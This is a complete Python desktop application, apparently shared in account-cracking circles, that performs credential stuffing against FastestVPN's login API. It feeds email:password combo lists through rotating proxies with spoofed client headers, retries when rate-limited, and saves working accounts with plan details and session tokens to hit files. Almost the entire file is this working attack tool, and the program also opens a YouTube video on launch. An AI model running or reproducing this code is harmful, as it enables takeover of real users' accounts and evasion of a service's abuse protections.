import sys
import os
import time
import json
import threading
import webbrowser
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox
import httpx

APP_TITLE = "FastestVPN API Checker | Telegram @therealyashvirgaming"
YOUTUBE_AUTOPLAY_URL = "https://www.youtube.com/watch?v=hkSX50QImSQ&list=RDhkSX50QImSQ&t=1s"
CREDITS_TELEGRAM = "https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT"
CREDITS_YOUTUBE = "https://www.youtube.com/@YashvirBlogger?sub_confirmation=1"
CREDITS_FACEBOOK = "https://www.facebook.com/groups/openbullet2configs"
RESULTS_DIR = "Results"
HITS_FILE = os.path.join(RESULTS_DIR, "hits.txt")
FREE_FILE = os.path.join(RESULTS_DIR, "free.txt")
EXPIRED_FILE = os.path.join(RESULTS_DIR, "expired.txt")
os.makedirs(RESULTS_DIR, exist_ok=True)

lock = threading.Lock()
counters = {"checked": 0, "hits": 0, "free": 0, "expired": 0, "retries": 0, "ban": 0, "fails": 0}
start_time = time.time()

def get_cpm():
    elapsed = time.time() - start_time
    mins = elapsed / 60.0
    with lock:
        if mins <= 0:
            return counters["checked"]
        return int(counters["checked"] / mins)

def append_result_file(path: str, line: str):
    dt = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"{line}\n{dt}\n\n")

DEFAULT_HEADERS = {
    "Host": "api.fastestvpn.com",
    "x-platform": "windows",
    "X-PLATFORM-TOKEN": "",
    "X-Application-Build-Number": "5.0.0.12",
    "X-PLATFORM-Build-Number": "Windows 10 Enterprise_24H2_26100",
    "Content-Type": "application/json; charset=UTF-8",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip, deflate",
}

def lr_parse(source: str, left: str, right: str):
    try:
        i = source.find(left)
        if i == -1:
            return None
        i += len(left)
        j = source.find(right, i)
        if j == -1:
            return source[i:]
        return source[i:j]
    except Exception:
        return None

def get_remaining_days(expiry_value):
    try:
        num = int(float(expiry_value))
        if num <= 0:
            return 0
        dt = datetime.utcfromtimestamp(num)
        delta = dt - datetime.utcnow()
        return max(0, delta.days)
    except Exception:
        pass
    for fmt in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
        try:
            dt = datetime.strptime(expiry_value, fmt)
            delta = dt - datetime.utcnow()
            return max(0, delta.days)
        except Exception:
            continue
    return None

def is_expired(expiry_value):
    if not expiry_value:
        return True
    ev = str(expiry_value).strip()
    if ev in ("0", "0.0", "0000", "1970", "1970-01-01", "0000-00-00"):
        return True
    try:
        num = int(float(ev))
        if num <= 0:
            return True
        dt = datetime.utcfromtimestamp(num)
        return dt < datetime.utcnow()
    except Exception:
        pass
    for fmt in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
        try:
            dt = datetime.strptime(ev, fmt)
            return dt < datetime.utcnow()
        except Exception:
            continue
    import re
    m = re.search(r"(\d{4})", ev)
    if m:
        year = int(m.group(1))
        return year < datetime.utcnow().year
    return True

def extract_fields(parsed_json, raw_text):
    caps = {}
    try:
        if isinstance(parsed_json, dict):
            token = parsed_json.get("token") or parsed_json.get("data", {}).get("token")
            if token:
                caps["token"] = token
            product = None
            if "product" in parsed_json:
                p = parsed_json.get("product")
                if isinstance(p, dict):
                    product = p.get("productName")
            if not product and parsed_json.get("data", {}).get("product"):
                p = parsed_json["data"]["product"]
                if isinstance(p, dict):
                    product = p.get("productName")
            if product:
                caps["Plan"] = product
            bc = parsed_json.get("product", {}).get("billingCycle") or parsed_json.get("data", {}).get("product", {}).get("billingCycle")
            if bc:
                caps["PlanType"] = bc
            if parsed_json.get("status"):
                caps["Status"] = parsed_json.get("status")
            expiry = parsed_json.get("suspenduntil") or parsed_json.get("data", {}).get("suspenduntil") or parsed_json.get("expiry") or parsed_json.get("expire")
            if expiry:
                caps["Expiry"] = str(expiry)
    except Exception:
        pass
    if "token" not in caps:
        token = lr_parse(raw_text, '"token":"', '"')
        if token:
            caps["token"] = token
    if "Plan" not in caps:
        plan = lr_parse(raw_text, '"product":{"productName":"', '"')
        if plan:
            caps["Plan"] = plan
    if "PlanType" not in caps:
        pt = lr_parse(raw_text, '"billingCycle":"', '"')
        if pt:
            caps["PlanType"] = pt
    if "Status" not in caps:
        st = lr_parse(raw_text, '"status":"', '"')
        if st:
            caps["Status"] = st
    if "Expiry" not in caps:
        ex = lr_parse(raw_text, '"suspenduntil":"', '"')
        if ex:
            caps["Expiry"] = ex
    if "Expiry" in caps:
        try:
            caps["DaysLeft"] = get_remaining_days(caps["Expiry"])
        except Exception:
            caps["DaysLeft"] = None
    return caps

def check_combo(email: str, password: str, proxy_line: str, timeout: int = 15):
    body = {
        "email": email,
        "password": password,
        "platform": "windows",
        "version": "Windows 10 Enterprise_24H2_26100",
        "dev": 1,
    }

    proxy_url = None
    if proxy_line:
        parts = proxy_line.strip().split(":")
        if len(parts) >= 4:
            ip, port, user, *pw = parts
            proxy_url = f"http://{user}:{':'.join(pw)}@{ip}:{port}"
        elif len(parts) == 2:
            ip, port = parts
            proxy_url = f"http://{ip}:{port}"

    try:
        transport = httpx.HTTPTransport(proxy=proxy_url, retries=0) if proxy_url else httpx.HTTPTransport()
        with httpx.Client(transport=transport, timeout=timeout) as client:
            resp = client.post(
                "https://api.fastestvpn.com/v2/authenticate",
                headers=DEFAULT_HEADERS,
                content=json.dumps(body),
            )
            status_code = resp.status_code
            text = resp.text or ""
    except httpx.ProxyError as e:
        return {"type": "fail", "reason": f"ProxyError: {e}"}
    except httpx.HTTPError as e:
        return {"type": "fail", "reason": f"HTTPError: {e}"}
    except Exception as e:
        return {"type": "fail", "reason": f"Exception: {e}"}
    parsed = {}
    try:
        parsed = resp.json()
    except Exception:
        parsed = {}
    low = text.lower()
    if "error code: 1015" in low or status_code == 403:
        return {"type": "retry", "status_code": status_code, "raw": text}
    if status_code == 429:
        return {"type": "ban", "status_code": status_code, "raw": text}
    failure_markers = ["invalid credentials", "\"error\":1", "failure"]
    for k in failure_markers:
        if k in low:
            return {"type": "fail", "status_code": status_code, "raw": text}
    expired_markers = ["account is suspended", "your subscription to our services has been expired"]
    for k in expired_markers:
        if k in low:
            cap = extract_fields(parsed, text)
            return {"type": "expired", "status_code": status_code, "raw": text, "caps": cap}
    if ("\"subscription\":false" in low) or ("productname" not in low and "\"product\"" in low):
        cap = extract_fields(parsed, text)
        return {"type": "free", "status_code": status_code, "raw": text, "caps": cap}
    success_markers = ["you have successfully logged-in", "\"token\":\"", "subscription\":true"]
    for k in success_markers:
        if k in low:
            cap = extract_fields(parsed, text)
            expiry = cap.get("Expiry")
            if expiry and is_expired(expiry):
                return {"type": "expired", "status_code": status_code, "raw": text, "caps": cap}
            return {"type": "hit", "status_code": status_code, "raw": text, "caps": cap}
    if "\"token\"" in low:
        cap = extract_fields(parsed, text)
        expiry = cap.get("Expiry")
        if expiry and is_expired(expiry):
            return {"type": "expired", "status_code": status_code, "raw": text, "caps": cap}
        return {"type": "hit", "status_code": status_code, "raw": text, "caps": cap}
    if "error" in low or resp.status_code >= 400:
        return {"type": "fail", "status_code": status_code, "raw": text}
    if "you do not have subscription to our services" in low:
        return {"type": "custom", "status_code": status_code, "raw": text}
    return {"type": "fail", "status_code": status_code, "raw": text}

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title(APP_TITLE)
        self.geometry("1150x720")
        self.protocol("WM_DELETE_WINDOW", self.on_close)
        try:
            webbrowser.open_new(YOUTUBE_AUTOPLAY_URL)
        except Exception:
            pass
        self.left_panel = ctk.CTkFrame(self, width=320, corner_radius=12)
        self.left_panel.pack(side="left", fill="y", padx=12, pady=12)
        self.brand_frame = ctk.CTkFrame(self.left_panel, corner_radius=12)
        self.brand_frame.pack(padx=12, pady=12, fill="x")
        self.logo = ctk.CTkLabel(self.brand_frame, text="FastestVPN", font=ctk.CTkFont(size=18, weight="bold"))
        self.logo.pack(pady=(10,4))
        self.subtitle = ctk.CTkLabel(self.brand_frame, text="API Checker • Telegram @therealyashvirgaming", font=ctk.CTkFont(size=10))
        self.subtitle.pack(pady=(0,10))
        bg_color = self.left_panel._bg_color
        if isinstance(bg_color, (tuple, list)):
            bg_color = bg_color[-1]
        if isinstance(bg_color, str) and " " in bg_color:
            bg_color = bg_color.split()[-1]
        self.canvas = tk.Canvas(self.left_panel, width=170, height=170, highlightthickness=0, bg=bg_color)
        self.canvas.pack(pady=6)
        self.progress_value = 0
        self.draw_progress(self.progress_value)
        self.stats_frame = ctk.CTkFrame(self.left_panel, corner_radius=8)
        self.stats_frame.pack(pady=8, padx=8, fill="x")
        self.lbl_cpm = ctk.CTkLabel(self.stats_frame, text="CPM: 0", font=ctk.CTkFont(size=14, weight="bold"))
        self.lbl_cpm.pack(anchor="w", padx=8, pady=(6,0))
        self.lbl_checked = ctk.CTkLabel(self.stats_frame, text="Checked: 0")
        self.lbl_checked.pack(anchor="w", padx=8)
        self.lbl_hits = ctk.CTkLabel(self.stats_frame, text="Hits: 0")
        self.lbl_hits.pack(anchor="w", padx=8)
        self.lbl_free = ctk.CTkLabel(self.stats_frame, text="Free: 0")
        self.lbl_free.pack(anchor="w", padx=8)
        self.lbl_expired = ctk.CTkLabel(self.stats_frame, text="Expired: 0")
        self.lbl_expired.pack(anchor="w", padx=8)
        self.lbl_retries = ctk.CTkLabel(self.stats_frame, text="Retries: 0")
        self.lbl_retries.pack(anchor="w", padx=8)
        self.lbl_ban = ctk.CTkLabel(self.stats_frame, text="Ban: 0")
        self.lbl_ban.pack(anchor="w", padx=8)
        self.lbl_fails = ctk.CTkLabel(self.stats_frame, text="Fails: 0")
        self.lbl_fails.pack(anchor="w", padx=8)
        self.center_frame = ctk.CTkFrame(self, corner_radius=12)
        self.center_frame.pack(side="top", fill="x", padx=12, pady=12)
        self.top_area = ctk.CTkFrame(self.center_frame, corner_radius=12)
        self.top_area.pack(padx=6, pady=6, fill="x")
        self.top_left = ctk.CTkFrame(self.top_area, corner_radius=8)
        self.top_left.pack(side="left", padx=12, pady=8, fill="both", expand=True)
        self.load_combos_btn = ctk.CTkButton(self.top_left, text="Load Combos", width=180, height=44, command=self.load_combos, fg_color=("#1f6feb","#1f6feb"))
        self.load_combos_btn.pack(padx=12, pady=12)
        self.combo_count_label = ctk.CTkLabel(self.top_left, text="Combos: 0")
        self.combo_count_label.pack(padx=12, pady=(0,12))
        self.load_proxies_btn = ctk.CTkButton(self.top_left, text="Load Proxies", width=180, height=44, command=self.load_proxies, fg_color=("#1fbf6f","#1fbf6f"))
        self.load_proxies_btn.pack(padx=12, pady=(0,12))
        self.proxy_count_label = ctk.CTkLabel(self.top_left, text="Proxies: 0")
        self.proxy_count_label.pack(padx=12, pady=(0,12))
        self.top_right = ctk.CTkFrame(self.top_area, corner_radius=8)
        self.top_right.pack(side="left", padx=12, pady=8, fill="both")
        self.threads_var = tk.StringVar(value="20")
        self.threads_entry = ctk.CTkEntry(self.top_right, placeholder_text="Threads (1-100)", textvariable=self.threads_var, width=140)
        self.threads_entry.pack(padx=12, pady=(16,6))
        self.threads_entry.bind("<FocusOut>", lambda e: self._sanitize_threads())
        self.quick_frame = ctk.CTkFrame(self.top_right, corner_radius=6)
        self.quick_frame.pack(padx=12, pady=6, fill="x")
        self.btn_start = ctk.CTkButton(self.quick_frame, text="Start", width=120, height=40, command=self.start_checking)
        self.btn_start.pack(side="left", padx=6, pady=6)
        self.btn_stop = ctk.CTkButton(self.quick_frame, text="Stop", width=120, height=40, fg_color="#ff4d4d", command=self.stop_checking, state="disabled")
        self.btn_stop.pack(side="left", padx=6, pady=6)
        self.btn_export = ctk.CTkButton(self.quick_frame, text="Export Output", width=120, height=36, command=self.export_output)
        self.btn_export.pack(side="left", padx=6, pady=6)
        self.btn_credits = ctk.CTkButton(self.quick_frame, text="Credits", width=120, height=36, command=self.show_credits)
        self.btn_credits.pack(side="left", padx=6, pady=6)
        self.output_frame = ctk.CTkFrame(self, corner_radius=12)
        self.output_frame.pack(side="bottom", fill="both", expand=True, padx=12, pady=12)
        self.output_text = tk.Text(self.output_frame, bg="#0b0b0b", fg="#dcdcdc", wrap="word")
        self.output_text.tag_configure("HIT", foreground="#39ff14")
        self.output_text.tag_configure("FREE", foreground="#00bfff")
        self.output_text.tag_configure("EXPIRED", foreground="#ff8c00")
        self.output_text.tag_configure("RETRY", foreground="#ffd700")
        self.output_text.tag_configure("BAN", foreground="#ff4d4d")
        self.output_text.tag_configure("FAIL", foreground="#888888")
        self.output_text.configure(state=tk.DISABLED)
        self.output_text.pack(fill="both", expand=True, padx=6, pady=6)
        self._stop_event = threading.Event()
        self.executor = None
        self.ui_queue = Queue()
        self.combos = []
        self.proxies = []
        self.after(200, self.process_ui_queue)
        self.after(1000, self.update_ui_counters)
        self._apply_button_effects()

    def _apply_button_effects(self):
        buttons = [
            self.load_combos_btn,
            self.load_proxies_btn,
            self.btn_start,
            self.btn_stop,
            self.btn_export,
            self.btn_credits
        ]
        for b in buttons:
            normal_color = b.cget("fg_color")
            hover_color = "#2aff85"  # bright neon green for hover effect
            b.bind("<Enter>", lambda e, btn=b: btn.configure(fg_color=hover_color))
            b.bind("<Leave>", lambda e, btn=b, color=normal_color: btn.configure(fg_color=color))

    def draw_progress(self, percent):
        c = self.canvas
        c.delete("all")
        x0, y0, x1, y1 = 10, 10, 160, 160
        c.create_oval(x0, y0, x1, y1, outline="#222222", width=14)
        extent = int(percent * 3.6)
        if extent > 0:
            c.create_arc(x0, y0, x1, y1, start=90, extent=-extent, style="arc", width=14, outline="#00ff88")
        txt = f"{int(percent)}%"
        c.create_text(85, 85, text=txt, fill="#dcdcdc", font=("Helvetica", 14, "bold"))

    def process_ui_queue(self):
        while not self.ui_queue.empty():
            item = self.ui_queue.get()
            typ = item.get("type")
            if typ == "append":
                self._append_output(item["text"], item.get("tag"))
            elif typ == "counters":
                self._update_counter_labels()
            elif typ == "progress":
                self.draw_progress(item["value"])
        self.after(200, self.process_ui_queue)

    def _append_output(self, text, tag=None):
        self.output_text.configure(state=tk.NORMAL)
        if tag:
            self.output_text.insert(tk.END, text + "\n", tag)
        else:
            self.output_text.insert(tk.END, text + "\n")
        self.output_text.see(tk.END)
        self.output_text.configure(state=tk.DISABLED)

    def _update_counter_labels(self):
        self.lbl_cpm.configure(text=f"CPM: {get_cpm()}")
        self.lbl_checked.configure(text=f"Checked: {counters['checked']}")
        self.lbl_hits.configure(text=f"Hits: {counters['hits']}")
        self.lbl_free.configure(text=f"Free: {counters['free']}")
        self.lbl_expired.configure(text=f"Expired: {counters['expired']}")
        self.lbl_retries.configure(text=f"Retries: {counters['retries']}")
        self.lbl_ban.configure(text=f"Ban: {counters['ban']}")
        self.lbl_fails.configure(text=f"Fails: {counters['fails']}")
        pct = min(100, (counters["checked"] / max(1, (self.safe_threads() * 50))) * 100)
        self.ui_queue.put({"type": "progress", "value": pct})

    def update_ui_counters(self):
        self.ui_queue.put({"type": "counters"})
        self.after(1000, self.update_ui_counters)

    def load_combos(self):
        path = filedialog.askopenfilename(title="Load combos (email:pass)", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if not path:
            return
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            raw = [l.strip() for l in f.read().splitlines() if l.strip() and ":" in l]
        self.combos = raw
        self.combo_count_label.configure(text=f"Combos: {len(self.combos)}")
        self.ui_queue.put({"type": "append", "text": f"Loaded {len(self.combos)} combos", "tag": None})

    def load_proxies(self):
        path = filedialog.askopenfilename(title="Load proxies (ip:port or ip:port:user:pass)", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if not path:
            return
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            raw = [l.strip() for l in f.read().splitlines() if l.strip()]
        self.proxies = raw
        self.proxy_count_label.configure(text=f"Proxies: {len(self.proxies)}")
        self.ui_queue.put({"type": "append", "text": f"Loaded {len(self.proxies)} proxies", "tag": None})

    def safe_threads(self):
        try:
            val = int(self.threads_var.get())
        except Exception:
            val = 20
            self.threads_var.set("20")
        val = max(1, min(100, val))
        return val

    def _sanitize_threads(self):
        try:
            v = int(self.threads_var.get())
        except Exception:
            v = 20
        v = max(1, min(100, v))
        self.threads_var.set(str(v))

    def export_output(self):
        fname = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt")])
        if not fname:
            return
        self.output_text.configure(state=tk.NORMAL)
        data = self.output_text.get("1.0", tk.END)
        self.output_text.configure(state=tk.DISABLED)
        with open(fname, "w", encoding="utf-8") as f:
            f.write(data)
        messagebox.showinfo("Exported", f"Output exported to:\n{fname}")

    def show_credits(self):
        win = ctk.CTkToplevel(self)
        win.title("Credits")
        win.geometry("480x160")
        ctk.CTkLabel(win, text="Credits & Links", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=8)
        btn_frame = ctk.CTkFrame(win)
        btn_frame.pack(pady=6, padx=6, fill="x")
        tg = ctk.CTkButton(btn_frame, text="Telegram", command=lambda: webbrowser.open_new(CREDITS_TELEGRAM))
        yt = ctk.CTkButton(btn_frame, text="YouTube", fg_color="#ff0000", command=lambda: webbrowser.open_new(CREDITS_YOUTUBE))
        fb = ctk.CTkButton(btn_frame, text="Facebook Group", command=lambda: webbrowser.open_new(CREDITS_FACEBOOK))
        tg.pack(side="left", padx=8, expand=True)
        yt.pack(side="left", padx=8, expand=True)
        fb.pack(side="left", padx=8, expand=True)

    def start_checking(self):
        if not self.combos:
            messagebox.showwarning("No combos", "Please load combos first using Load Combos.")
            return
        bots = self.safe_threads()
        self._stop_event.clear()
        self.executor = ThreadPoolExecutor(max_workers=bots)
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        proxy_cycle = self.proxies or [""]
        for idx, combo in enumerate(self.combos):
            if ":" not in combo:
                continue
            email, password = combo.split(":", 1)
            proxy_line = proxy_cycle[idx % len(proxy_cycle)]
            self.executor.submit(self.worker_wrapper, email.strip(), password.strip(), proxy_line.strip())
        self.ui_queue.put({"type": "append", "text": f"Started checking {len(self.combos)} combos with {bots} threads", "tag": None})

    def stop_checking(self):
        self._stop_event.set()
        if self.executor:
            try:
                self.executor.shutdown(wait=False)
            except Exception:
                pass
        self.btn_start.configure(state="normal")
        self.btn_stop.configure(state="disabled")
        self.ui_queue.put({"type": "append", "text": "Stopped checking", "tag": None})

    def on_close(self):
        self.stop_checking()
        self.destroy()
        sys.exit(0)

    def worker_wrapper(self, email, password, proxy_line):
        max_retries = 2
        attempt = 0
        while attempt <= max_retries and not self._stop_event.is_set():
            attempt += 1
            res = check_combo(email, password, proxy_line)
            with lock:
                counters["checked"] += 1
            self.ui_queue.put({"type": "counters"})
            tag = None
            display_line = None
            if res["type"] == "hit":
                with lock:
                    counters["hits"] += 1
                tag = "HIT"
                caps = res.get("caps", {})
                token = caps.get("token", "")
                plan = caps.get("Plan", "")
                plan_type = caps.get("PlanType", "")
                daysleft = caps.get("DaysLeft")
                display_line = f"HIT | {email}:{password} | Plan={plan} | Type={plan_type} | DaysLeft={daysleft} | token={token}"
                append_result_file(HITS_FILE, display_line)
            elif res["type"] == "free":
                with lock:
                    counters["free"] += 1
                tag = "FREE"
                caps = res.get("caps", {})
                plan = caps.get("Plan", "")
                display_line = f"FREE | {email}:{password} | Plan={plan}"
                append_result_file(FREE_FILE, display_line)
            elif res["type"] == "expired":
                with lock:
                    counters["expired"] += 1
                tag = "EXPIRED"
                caps = res.get("caps", {})
                exp = caps.get("Expiry", "")
                display_line = f"EXPIRED | {email}:{password} | Expiry={exp}"
                append_result_file(EXPIRED_FILE, display_line)
            elif res["type"] == "retry":
                with lock:
                    counters["retries"] += 1
                tag = "RETRY"
                display_line = f"RETRY | {email}:{password} | reason: {res.get('raw')[:200]}"
            elif res["type"] == "ban":
                with lock:
                    counters["ban"] += 1
                tag = "BAN"
                display_line = f"BAN | {email}:{password} | code={res.get('status_code')}"
            else:
                with lock:
                    counters["fails"] += 1
                tag = "FAIL"
                display_line = f"FAIL | {email}:{password} | reason: {res.get('reason') if 'reason' in res else res.get('raw', '')[:200]}"
            self.ui_queue.put({"type": "append", "text": display_line, "tag": tag})
            self.ui_queue.put({"type": "counters"})
            if res["type"] == "retry" and attempt <= max_retries:
                time.sleep(1)
                continue
            break

def main():
    app = App()
    app.mainloop()

if __name__ == "__main__":
    main()
